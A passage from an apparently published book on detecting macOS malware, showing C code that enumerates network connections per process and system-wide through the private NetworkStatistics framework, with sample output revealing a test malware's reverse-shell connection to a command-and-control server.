<p class="TX">The IP address-to-host resolution code first invokes the <span class="SANS_TheSansMonoCd_W5Regular_11">getaddrinfo</span> function with the passed-in IP address <span class="CodeAnnotation" aria-label="annotation1">❶</span>. If this call succeeds, it allocates and initializes a list of structures of type <span class="SANS_TheSansMonoCd_W5Regular_11">addrinfo</span> for the specified address, as there may be multiple responses. The code then begins iterating over this list <span class="CodeAnnotation" aria-label="annotation2">❷</span>, invoking the <span class="SANS_TheSansMonoCd_W5Regular_11">getnameinfo</span> function on the <span class="SANS_TheSansMonoCd_W5Regular_11">addrinfo</span> structures <span class="CodeAnnotation" aria-label="annotation3">❸</span>. If the <span class="SANS_TheSansMonoCd_W5Regular_11">getnameinfo</span> function succeeds, the code converts the name to a string object and exits the loop, though it could also keep iterating to build up a list of all resolved names.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec7">&#13;
&#13;
<h4 class="H2"><span id="sec7"/><span id="h2-36"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Running the Tool</span></h4>&#13;
<p class="TNI">Let’s compile and run the network enumeration code, found in the <i>enumerateNetworkConnections</i> project, on a system that is infected with Dummy. The code looks at only one process at a time, so we specify the process ID (96202) belonging to the instance of Dummy’s Python script as an argument:</p>&#13;
&#13;
<pre><code>% <b>./enumerateNetworkConnections 96202</b>&#13;
Socket details: {&#13;
    family = "IPv4";&#13;
    protocol = "TCP";&#13;
    localPort = 63353;&#13;
    localIP = "192.168.1.245";&#13;
    remotePort = 1337;&#13;
    remoteIP = "185.243.115.230";&#13;
    resolved = "pttr2.qrizi.com";&#13;
    state = "ESTABLISHED";&#13;
}&#13;
</code></pre>&#13;
<p class="TX">As expected, the tool is able to enumerate Dummy’s connection to the attacker’s command-and-control server. Specifically, it shows the information about both the local and remote endpoints of the connection, as well as the connection’s family, protocol, and state.</p>&#13;
<p class="TX">To improve this code in production, you would likely want to enumerate all network connections, not only those for the single process a user specified. You could easily extend the code to first retrieve a list of running processes and then iterate through this list to enumerate each process’s network connections. Recall that in <span class="Xref"><a href="chapter1.xhtml">Chapter 1</a></span> I showed how to retrieve a list of process IDs.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec8">&#13;
&#13;
<h3 class="H1"><span id="sec8"/><span id="h1-37"/><span class="SANS_Futura_Std_Bold_B_11">Enumerating Network Connections</span></h3>&#13;
<p class="TNI">I noted that one minor downside to using the <span class="SANS_TheSansMonoCd_W5Regular_11">proc_pid*</span> APIs is that they are process specific. That is to say they don’t return information about system-wide network activity. Although we could easily iterate over each process to get a broader look at the system’s network activity, the private <i>NetworkStatistics</i> framework provides a more efficient way to accomplish this task. It also offers statistics about each connection, which can help us detect <span role="doc-pagebreak" epub:type="pagebreak" id="pg_112" aria-label="112"/>malware specimens (for example, those that exfiltrate large amounts of data from an infected system).</p>&#13;
<p class="TX">In this section, we’ll use this framework to take a one-time snapshot of global network activity, and in <span class="Xref"><a href="chapter7.xhtml">Chapter 7</a></span>, we’ll leverage it to continually receive updates about network activity as it occurs.</p>&#13;
<p class="TX">The <i>NetworkStatistics</i> framework underlies a relatively unknown networking utility that macOS ships with: <span class="SANS_TheSansMonoCd_W5Regular_11">nettop</span>. When executed from the terminal, <span class="SANS_TheSansMonoCd_W5Regular_11">nettop</span> displays system-wide network activity grouped by process. Here is the abridged output from <span class="SANS_TheSansMonoCd_W5Regular_11">nettop</span> when run on my Mac:</p>&#13;
&#13;
<pre><code>% <b>nettop</b>&#13;
&#13;
launchd.1&#13;
    tcp6 *.49152&lt;-&gt;*.*&#13;
        Listen&#13;
&#13;
timed.352&#13;
    udp4 192.168.1.245:123&lt;-&gt;usscz2-ntp-001.aaplimg.com:123&#13;
&#13;
WhatsApp Helper.1186&#13;
    tcp6 2603:800c:2800:641::cc.54413&lt;-&gt;whatsapp-cdn6-shv-01-lax3.fbcdn.net.443   Established&#13;
&#13;
com.apple.WebKi.78285&#13;
tcp6 2603:800c:2800:641::cc.54863&lt;-&gt;lax17s49-in-x0a.1e100.net.443  Established&#13;
tcp4 192.168.1.245:54810&lt;-&gt;104.244.42.66:443   Established&#13;
tcp4 192.168.1.245:54805&lt;-&gt;104.244.42.129:443  Established&#13;
&#13;
Signal Helper (.8431&#13;
tcp4 192.168.1.245:54874&lt;-&gt;ac88393aca5853df7.awsglobalaccelerator.com:443    Established&#13;
tcp4 192.168.1.245:54415&lt;-&gt;ac88393aca5853df7.awsglobalaccelerator.com:443    Established&#13;
</code></pre>&#13;
<p class="TX">We can use <span class="SANS_TheSansMonoCd_W5Regular_11">otool</span> to see that <span class="SANS_TheSansMonoCd_W5Regular_11">nettop</span> leverages the <i>NetworkStatistics</i> framework. In older versions of macOS, you’ll find this framework in <i>/System/Library/PrivateFrameworks/</i>, while on newer versions, it’s stored in the <i>dyld</i> shared cache:</p>&#13;
&#13;
<pre><code>% <b>otool -L /usr/bin/nettop</b>&#13;
/usr/bin/nettop:&#13;
  /System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation&#13;
  /usr/lib/libncurses.dylib&#13;
  <b>/System/Library/PrivateFrameworks/NetworkStatistics.framework/Versions/A/NetworkStatistics</b>&#13;
  /usr/lib/libSystem.B.dylib&#13;
</code></pre>&#13;
<p class="TX">Let’s programmatically enumerate system-wide network activity using this framework, which can provide us with network statistic objects representing listening sockets, network connections, and more. The macOS guru Jonathan Levin first documented this approach in his <span class="SANS_TheSansMonoCd_W5Regular_11">netbottom</span> command line tool.<sup><a role="doc-noteref" id="chapter4_6" href="#chapter4-6">6</a></sup> The code presented in this section, and in this chapter’s <i>enumerateNetworkStatistics</i> project, is directly inspired by his project.</p>&#13;
<section epub:type="division" aria-labelledby="sec9">&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_113" aria-label="113"/>&#13;
<h4 class="H2"><span id="sec9"/><span id="h2-37"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Linking to NetworkStatistics</span></h4>&#13;
<p class="TNI">Any program that leverages a framework must either be linked in at compile time or dynamically loaded at runtime. In Xcode, you can add a framework to the Link Binary with Libraries list under Build Phases (<a href="chapter4.xhtml#fig4-2">Figure 4-2</a>).</p>&#13;
<figure class="IMG"><img class="img7" id="fig4-2" src="../images/Figure4-2.jpg" alt="" width="1203" height="415"/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 4-2: Linking to the</span> <span class="SANS_Futura_Std_Book_11">NetworkStatistics</span> <span class="SANS_Futura_Std_Book_Oblique_I_11">framework</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">Because the <i>NetworkStatistics</i> framework is private, there is no publicly available header file, so you’ll have to manually define its APIs and constants. For example, you can create an instance of a network statistic manager using the <span class="SANS_TheSansMonoCd_W5Regular_11">NStatManagerCreate</span> API, but you must first define this API, as shown in <a href="chapter4.xhtml#Lis4-12">Listing 4-12</a>.</p>&#13;
<span id="Lis4-12"/>&#13;
<pre><code>NStatManagerRef NStatManagerCreate(&#13;
const struct __CFAllocator*, dispatch_queue_t, void (^)(void*, int));&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 4-12: A function definition for the private <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">NStatManagerCreate</span> API</span></p>&#13;
<p class="TX">Similarly, you must define all constants, such as the keys in the dictionary that describe each network statistic object. For example, <a href="chapter4.xhtml#Lis4-13">Listing 4-13</a> shows how you would define <span class="SANS_TheSansMonoCd_W5Regular_11">kNStatSrcKeyPID</span>, the key that holds the ID of the process responsible for the network connection in question.</p>&#13;
<span id="Lis4-13"/>&#13;
<pre><code>extern CFStringRef kNStatSrcKeyPID;</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 4-13: A definition of the private <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">kNStatSrcKeyPID</span> constant</span></p>&#13;
<p class="TX">See this chapter’s <i>enumerateNetworkStatistics</i> project’s header file for all function and constant definitions.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec10">&#13;
&#13;
<h4 class="H2"><span id="sec10"/><span id="h2-38"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Creating Network Statistic Managers</span></h4>&#13;
<p class="TNI">Now that we’ve linked to the <i>NetworkStatistics</i> framework and defined the necessary APIs and constants, it’s time to write some code. In <a href="chapter4.xhtml#Lis4-14">Listing 4-14</a>, we create a network statistic manager via the <span class="SANS_TheSansMonoCd_W5Regular_11">NStatManagerCreate</span> API. This manager is an opaque object required for subsequent <i>NetworkStatistics</i> API calls.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_114" aria-label="114"/>As its first parameter, <span class="SANS_TheSansMonoCd_W5Regular_11">NStatManagerCreate</span> API takes a memory allocator. Here, we use the default allocator, <span class="SANS_TheSansMonoCd_W5Regular_11">kCFAllocatorDefault</span>. The second parameter is a dispatch queue, where we’ll execute the callback block specified in the third argument. I recommend using a custom dispatch queue rather than the main thread’s dispatch queue to avoid overusing, and potentially blocking, the main thread.</p>&#13;
<span id="Lis4-14"/>&#13;
<pre><code><span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> dispatch_queue_t queue = dispatch_queue_create("queue", NULL);&#13;
&#13;
NStatManagerRef manager = NStatManagerCreate(kCFAllocatorDefault, queue,&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation2">❷</span> ^(NStatSourceRef source, int unknown) {&#13;
    // Add code here to complete the implementation.&#13;
});&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 4-14: Initializing a network statistic manager</span></p>&#13;
<p class="TX">After we initialize the dispatch queue <span class="CodeAnnotation" aria-label="annotation1">❶</span>, we invoke <span class="SANS_TheSansMonoCd_W5Regular_11">NStatManagerCreate</span> to create a manager object. The last parameter for this API is a callback block that the framework will invoke during a query. It takes two arguments: an <span class="SANS_TheSansMonoCd_W5Regular_11">NStatSourceRef</span> object representing a network statistic and an integer whose meaning is unknown (but that also doesn’t appear relevant to our code) <span class="CodeAnnotation" aria-label="annotation2">❷</span>. In the next section, I’ll explain how to extract network information of interest when the framework invokes this callback.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec11">&#13;
&#13;
<h4 class="H2"><span id="sec11"/><span id="h2-39"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Defining Callback Logic</span></h4>&#13;
<p class="TNI">The framework will invoke the <span class="SANS_TheSansMonoCd_W5Regular_11">NStatManagerCreate</span> callback block automatically when we kick off a query using the <span class="SANS_TheSansMonoCd_W5Regular_11">NStatManagerQueryAllSourcesDescriptions</span> API, which is discussed shortly. To extract information from each network statistic object passed into the callback block, we invoke the <span class="SANS_TheSansMonoCd_W5Regular_11">NStatSourceSetDescriptionBlock</span> API to specify yet another callback block. Here is this function’s definition:</p>&#13;
&#13;
<pre><code>void NStatSourceSetDescriptionBlock(NStatSourceRef arg, void (^)(NSMutableDictionary*));</code></pre>&#13;
<p class="TX">We call this function with the <span class="SANS_TheSansMonoCd_W5Regular_11">NStatSourceRef</span> object and a callback block, which the framework will invoke asynchronously with a dictionary containing information about the network statistic object (<a href="chapter4.xhtml#Lis4-15">Listing 4-15</a>).</p>&#13;
<span id="Lis4-15"/>&#13;
<pre><code>NStatManagerRef = NStatManagerCreate(kCFAllocatorDefault, queue,&#13;
^(NStatSourceRef source, int unknown) {&#13;
    NStatSourceSetDescriptionBlock(source, ^(NSMutableDictionary* description) {&#13;
        printf("%s\n", description.description.UTF8String);&#13;
    });&#13;
});&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 4-15: Setting a description callback block</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_115" aria-label="115"/>As it stands, the code won’t perform any operation until we start a query. Once we’ve started a query, it will invoke this block; for now, we simply print out the dictionary that describes the network statistic object.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec12">&#13;
&#13;
<h4 class="H2"><span id="sec12"/><span id="h2-40"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Starting Queries</span></h4>&#13;
<p class="TNI">Before starting a query, we must tell the framework what network statistics we’re interested in. For statistics on all TCP and UDP network sockets and connections, we invoke the <span class="SANS_TheSansMonoCd_W5Regular_11">NStatManagerAddAllTCP</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">NStatManagerAddAllUDP</span> functions, respectively. As you can see in <a href="chapter4.xhtml#Lis4-16">Listing 4-16</a>, both take a network statistic manager (which we’ve previously created) as their only argument.</p>&#13;
<span id="Lis4-16"/>&#13;
<pre><code>NStatManagerAddAllTCP(manager);&#13;
NStatManagerAddAllUDP(manager);&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 4-16: Querying for statistics about TCP and UDP network events</span></p>&#13;
<p class="TX">Now we can kick off the query via the <span class="SANS_TheSansMonoCd_W5Regular_11">NStatManagerQueryAllSourcesDescriptions</span> function (<a href="chapter4.xhtml#Lis4-17">Listing 4-17</a>).</p>&#13;
<span id="Lis4-17"/>&#13;
<pre><code>dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> NStatManagerQueryAllSourcesDescriptions(manager, ^{&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation2">❷</span> dispatch_semaphore_signal(semaphore);&#13;
});&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation3">❸</span> dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER);&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation4">❹</span> NStatManagerDestroy(manager);&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 4-17: Querying all network sources</span></p>&#13;
<p class="TX">Once we invoke the <span class="SANS_TheSansMonoCd_W5Regular_11">NStatManagerQueryAllSourcesDescriptions</span> function <span class="CodeAnnotation" aria-label="annotation1">❶</span>, the network statistic query will begin, invoking the callback block we set for each network statistic object to provide a comprehensive snapshot of the current state of the network.</p>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">NStatManagerQueryAllSourcesDescriptions</span> function takes the network statistic manager and yet another callback block to invoke when the network query completes. In this implementation, we’re interested in a one-time snapshot of the network, so we signal a semaphore <span class="CodeAnnotation" aria-label="annotation2">❷</span> on which the main thread is waiting <span class="CodeAnnotation" aria-label="annotation3">❸</span>. When the query completes, we clean up the network statistic manager using the <span class="SANS_TheSansMonoCd_W5Regular_11">NStatManagerDestroy</span> function <span class="CodeAnnotation" aria-label="annotation4">❹</span>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec13">&#13;
&#13;
<h4 class="H2"><span id="sec13"/><span id="h2-41"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Running the Tool</span></h4>&#13;
<p class="TNI">If we compile and run this code, it will enumerate all network connections and listening sockets, including Dummy’s remote shell connection:</p>&#13;
&#13;
<pre><code>% <b>./enumerateNetworkStatistics</b>&#13;
...&#13;
{&#13;
    TCPState = Established;&#13;
    ...&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_116" aria-label="116"/>    ifWiFi = 1;&#13;
    interface = 12;&#13;
    localAddress = {length = 16, bytes = 0x1002c7f9c0a801f50000000000000000};&#13;
    processID = 96202;&#13;
    processName = Python;&#13;
    provider = TCP;&#13;
    ...&#13;
    remoteAddress = {length = 16, bytes = 0x10020539b9f373e60000000000000000};&#13;
    ...&#13;
}&#13;
</code></pre>&#13;
<p class="TX">The local address (<span class="SANS_TheSansMonoCd_W5Regular_11">kNStatSrcKeyLocal</span>) and remote address (<span class="SANS_TheSansMonoCd_W5Regular_11">kNStatSrcKeyRemote</span>) are stored in <span class="SANS_TheSansMonoCd_W5Regular_11">NSData</span> objects, which contain <span class="SANS_TheSansMonoCd_W5Regular_11">sockaddr_in</span> or <span class="SANS_TheSansMonoCd_W5Regular_11">sockaddr_in6</span> structures. If you want to convert them into printable strings, you’ll need to invoke routines such as <span class="SANS_TheSansMonoCd_W5Regular_11">inet_ntop</span>. <a href="chapter4.xhtml#Lis4-18">Listing 4-18</a> shows the code to do this.</p>&#13;
<span id="Lis4-18"/>&#13;
<pre><code>NSString* convertAddress(NSData* data) {&#13;
    in_port_t port = 0;&#13;
    char address[INET6_ADDRSTRLEN] = {0};&#13;
&#13;
    struct sockaddr_in* ipv4 = NULL;&#13;
    struct sockaddr_in6* ipv6 = NULL;&#13;
&#13;
    if(AF_INET == ((struct sockaddr*)data.bytes)-&gt;sa_family) { <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
        ipv4 = (struct sockaddr_in*)data.bytes;&#13;
        port = ntohs(ipv4-&gt;sin_port);&#13;
        inet_ntop(AF_INET, (const void*)&amp;ipv4-&gt;sin_addr, address, INET_ADDRSTRLEN);&#13;
    } else if (AF_INET6 == ((struct sockaddr*)data.bytes)-&gt;sa_family) { <span class="codewide_CodeAnnotation" aria-label="annotation2">❷</span>&#13;
        ipv6 = (struct sockaddr_in6*)data.bytes;&#13;
        port = ntohs(ipv6-&gt;sin6_port);&#13;
        inet_ntop(AF_INET6, (const void*)&amp;ipv6-&gt;sin6_addr, address, INET6_ADDRSTRLEN);&#13;
    }&#13;
&#13;
    return [NSString stringWithFormat:@"%s:%hu", address, port];&#13;
}&#13;
...&#13;
&#13;
NStatManagerRef = NStatManagerCreate(kCFAllocatorDefault, queue,&#13;
^(NStatSourceRef source, int unknown) {&#13;
    NStatSourceSetDescriptionBlock(source, ^(NSMutableDictionary* description) {&#13;
        NSData* source = description[(__bridge NSString*)kNStatSrcKeyLocal];&#13;
        NSData* destination = description[(__bridge NSString*)kNStatSrcKeyRemote];&#13;
&#13;
        printf("%s\n", description.description.UTF8String);&#13;
        printf("%s -&gt; %s\n",&#13;
        convertAddress(source).UTF8String, convertAddress(destination).UTF8String); <span class="codewide_CodeAnnotation" aria-label="annotation3">❸</span>&#13;
    });&#13;
&#13;
});&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 4-18: Converting a data object into a human-readable address and port</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_117" aria-label="117"/>This simple helper function accepts a network statistic address and then extracts and formats the port and IP address for both IPv4 <span class="CodeAnnotation" aria-label="annotation1">❶</span> and IPv6 addresses <span class="CodeAnnotation" aria-label="annotation2">❷</span>. Here, it prints out both the source and destination endpoints <span class="CodeAnnotation" aria-label="annotation3">❸</span> to provide more readable output. As an example, the following output displays statistics about Dummy’s reverse shell:</p>&#13;
&#13;
<pre><code>% <b>./enumerateNetworkStatistics</b>&#13;
...&#13;
{&#13;
    TCPState = Established;&#13;
    ...&#13;
    ifWiFi = 1;&#13;
    interface = 12;&#13;
    <b>localAddress = 192.168.1.245:63353</b>&#13;
    processID = 96202;&#13;
    processName = Python;&#13;
    provider = TCP;&#13;
    ...&#13;
    <b>remoteAddress = 185.243.115.230:1337</b>&#13;
    ...&#13;
}&#13;
</code></pre>&#13;
<p class="TX">Although not shown in this abridged output, the network statistic dictionary also contains <span class="SANS_TheSansMonoCd_W5Regular_11">kNStatSrcKeyTxBytes</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">kNStatSrcKeyRxBytes</span> keys, which hold the number of bytes uploaded and downloaded, respectively. <a href="chapter4.xhtml#Lis4-19">Listing 4-19</a> shows how one might programmatically extract these traffic statistics as unsigned long integers.</p>&#13;
<span id="Lis4-19"/>&#13;
<pre><code>NStatSourceSetDescriptionBlock(source, ^(NSMutableDictionary* description) {&#13;
    unsigned long bytesUp =&#13;
    [description[(__bridge NSString *)kNStatSrcKeyTxBytes] unsignedLongValue];&#13;
&#13;
    unsigned long bytesDown =&#13;
    [description[(__bridge NSString *)kNStatSrcKeyRxBytes] unsignedLongValue];&#13;
    ...&#13;
});&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 4-19: Extracting traffic statistics</span></p>&#13;
<p class="TX">This data can help us gain insight into traffic trends. For example, a connection with a large number of uploaded bytes tied to an unknown process may reveal malware exfiltrating a large amount of data to a remote server.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="conclusion" role="doc-conclusion" aria-labelledby="sec14">&#13;
&#13;
<h3 class="H1"><span id="sec14"/><span id="h1-38"/><span class="SANS_Futura_Std_Bold_B_11">Conclusion</span></h3>&#13;
<p class="TNI">The majority of malware interacts with the network, providing us with the opportunity to build powerful heuristics. In this chapter, I presented two methods of programmatically enumerating the state of a network and then associating this state with the responsible processes. The ability to identify the process responsible for a listening socket or established connection <span role="doc-pagebreak" epub:type="pagebreak" id="pg_118" aria-label="118"/>is essential for accurately detecting malware and is one of the main advantages of host-based approaches over network-centric ones.</p>&#13;
<p class="TX">So far, we’ve built heuristics based on information gleaned from processes (in <span class="Xref"><a href="chapter1.xhtml">Chapter 1</a></span>), binaries (in <span class="Xref"><a href="chapter2.xhtml">Chapter 2</a></span>), code signing (in <span class="Xref"><a href="chapter3.xhtml">Chapter 3</a></span>), and the network (in this chapter). But the operating system provides other sources of detection as well. In the next chapter, you’ll dive into the detection of persistence techniques.</p>&#13;
</section>&#13;
<section epub:type="rearnotes" role="doc-endnotes" aria-labelledby="sec15">&#13;
&#13;
<h3 class="H1"><span id="sec15"/><span class="SANS_Futura_Std_Bold_B_11">Notes</span></h3>&#13;
<ol class="footnotes">&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter4-1" href="#chapter4_1">  1</a></span>.  Patrick Wardle, “The Mac Malware of 2022,” Objective-See, January 1, 2023, <a href="https://objective-see.org/blog/blog_0x71.html#-insekt"><i>https://<wbr/>objective<wbr/>-see<wbr/>.org<wbr/>/blog<wbr/>/blog<wbr/>_0x71<wbr/>.html#<wbr/>-insekt</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter4-2" href="#chapter4_2">  2</a></span>.  See <a href="https://objective-see.org/products/netiquette.html"><i>https://<wbr/>objective<wbr/>-see<wbr/>.org<wbr/>/products<wbr/>/netiquette<wbr/>.html</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter4-3" href="#chapter4_3">  3</a></span>.  Patrick Wardle, “Making oRAT Go,” paper presented at Objective by the Sea v5, Spain, October 7, 2022, <a href="https://objectivebythesea.org/v5/talks/OBTS_v5_pWardle.pdf"><i>https://<wbr/>objectivebythesea<wbr/>.org<wbr/>/v5<wbr/>/talks<wbr/>/OBTS<wbr/>_v5<wbr/>_pWardle<wbr/>.pdf</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter4-4" href="#chapter4_4">  4</a></span>.  Daniel Lunghi and Jaromir Horejsi, “New APT Group Earth Berberoka Targets Gambling Websites with Old and New Malware,” TrendMicro, April 27, 2022, <a href="https://www.trendmicro.com/en_ph/research/22/d/new-apt-group-earth-berberoka-targets-gambling-websites-with-old.html"><i>https://<wbr/>www<wbr/>.trendmicro<wbr/>.com<wbr/>/en<wbr/>_ph<wbr/>/research<wbr/>/22<wbr/>/d<wbr/>/new<wbr/>-apt<wbr/>-group<wbr/>-earth<wbr/>-berberoka<wbr/>-targets<wbr/>-gambling<wbr/>-websites<wbr/>-with<wbr/>-old<wbr/>.html</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter4-5" href="#chapter4_5">  5</a></span>.  See <a href="https://github.com/palominolabs/get_process_handles"><i>https://<wbr/>github<wbr/>.com<wbr/>/palominolabs<wbr/>/get<wbr/>_process<wbr/>_handles</i></a>.</p></li>&#13;
<li><p class="NTX"><span class="en_tx"><a id="chapter4-6" href="#chapter4_6">  6</a></span>.  See <a href="http://newosxbook.com/src.jl?tree=listings&amp;file=netbottom.c"><i>http://<wbr/>newosxbook<wbr/>.com<wbr/>/src<wbr/>.jl<wbr/>?tree<wbr/>=listings&amp;file<wbr/>=netbottom<wbr/>.c</i></a>.</p></li>&#13;
</ol>&#13;
</section>&#13;
</section>&#13;
</div>
</div>
</body></html>